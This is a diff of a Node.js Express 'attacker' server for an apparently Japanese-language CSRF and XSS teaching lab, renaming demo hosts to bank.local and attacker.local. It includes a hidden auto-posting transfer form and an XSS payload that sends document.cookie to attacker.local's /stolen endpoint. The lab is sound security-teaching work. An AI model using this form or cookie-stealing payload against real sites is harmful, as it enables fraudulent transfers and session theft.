@@ -1,4 +1,4 @@
-// attacker.example.com の代わり（port 3001）
+// attacker.local:3001
 const express = require('express')
 const app = express()
 
@@ -41,14 +41,14 @@ function attackerPage() {
     <h3>Attack: CSRF</h3>
     <p>被害者は <strong>bank.example.com にログイン中</strong> です。このページを開くだけで送金リクエストが飛びます。</p>
 
-    <div class="step"><div class="step-num">1</div><p><a href="http://localhost:3000" target="_blank" style="color:#5dade2">localhost:3000</a> でログインして残高（¥10,000）を確認する</p></div>
+    <div class="step"><div class="step-num">1</div><p><a href="http://bank.local:3000" target="_blank" style="color:#5dade2">bank.local:3000</a> でログインして残高（¥10,000）を確認する</p></div>
     <div class="step"><div class="step-num">2</div><p>bank 側の設定を切り替えて、下のボタンを押す</p></div>
     <div class="step"><div class="step-num">3</div><p>bank に戻って残高とログを確認する</p></div>
 
     <hr>
 
     <!-- 攻撃フォーム（隠れている） -->
-    <form id="csrfForm" method="POST" action="http://localhost:3000/transfer" style="display:none">
+    <form id="csrfForm" method="POST" action="http://bank.local:3000/transfer" style="display:none">
       <input name="to" value="attacker">
       <input name="amount" value="3000">
       <!-- CSRFトークンは知らないので入れられない -->
@@ -71,16 +71,16 @@ function attackerPage() {
   <div class="card">
     <h3>おまけ：XSS との違い</h3>
     <p>CSRF は Cookie を「盗まない」。ブラウザが自動付与するだけ。</p>
-    <p>XSS は Cookie や localStorage を「盗む」。デモは <a href="http://localhost:3000/comments" target="_blank" style="color:#5dade2">コメント掲示板</a> で確認できる。</p>
+    <p>XSS は Cookie や localStorage を「盗む」。デモは <a href="http://bank.local:3000/comments" target="_blank" style="color:#5dade2">コメント掲示板</a> で確認できる。</p>
     <div class="note">
       XSS ペイロード例：<br>
-      <code>&lt;img src=x onerror="fetch('http://localhost:3001/stolen?c='+document.cookie)"&gt;</code>
+      <code>&lt;img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)"&gt;</code>
     </div>
   </div>
 </div>
 
 <div class="footer">
-  bank サイト → <a href="http://localhost:3000" target="_blank">localhost:3000</a>
+  bank サイト → <a href="http://bank.local:3000" target="_blank">bank.local:3000</a>
 </div>
 
 </body></html>`
@@ -95,5 +95,5 @@ app.get('/stolen', (req, res) => {
 })
 
 app.listen(3001, () => {
-  console.log('attacker:       http://localhost:3001')
+  console.log('attacker: http://attacker.local:3001')
 })
